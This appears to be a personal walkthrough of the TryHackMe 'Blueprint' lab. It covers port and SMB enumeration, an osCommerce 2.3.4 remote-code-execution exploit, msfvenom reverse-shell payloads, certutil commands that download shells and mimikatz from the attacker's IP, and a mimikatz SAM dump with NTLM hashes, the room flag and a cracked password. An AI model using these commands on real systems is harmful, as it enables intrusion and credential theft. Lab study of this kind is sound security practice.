# Blueprint 

> VOiD | Monday 29 November 2021 04:53:53 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.2.21

## rustscan
```bash
PORT      STATE SERVICE     REASON
80/tcp    open  http        syn-ack
135/tcp   open  msrpc       syn-ack
139/tcp   open  netbios-ssn syn-ack
3306/tcp  open  mysql       syn-ack
49152/tcp open  unknown     syn-ack
49153/tcp open  unknown     syn-ack
49154/tcp open  unknown     syn-ack
49158/tcp open  unknown     syn-ack
49159/tcp open  unknown     syn-ack
49160/tcp open  unknown     syn-ack
```


## PORT 139 [SMB]
```bash
smbclient -L 10.10.2.21         
Enter WORKGROUP\voids password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
	Windows         Disk  

smbclient \\\\10.10.2.21\\Users
# LOTs of data
smbclient \\\\10.10.2.21\\Windows
# access denied
```

## PORT 8080 [http]
```bash

Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 Server at 10.10.2.21 Port 8080

http://10.10.2.21:8080/oscommerce-2.3.4/

searchsploit gives 2 rce trying both

python3 exploit.py http://10.10.2.21:8080/oscommerce-2.3.4/catalog/ 
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.253.221 LPORT=4444 -f exe -o rev.exe 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.253.221 LPORT=53 -f exe -o shell.exe


cmd.exe /C certutil -urlcache -split -f http://10.8.253.221/shell.exe shell.exe
cmd.exe /C certutil -urlcache -split -f http://10.8.253.221/rev_win.php rev_win.php
certutil -urlcache -f http://10.8.253.221/mimikatz.exe mimikatz.exe

use the reverse_win.php to get the shell 

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}

mimikatz # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450

googleplus
```

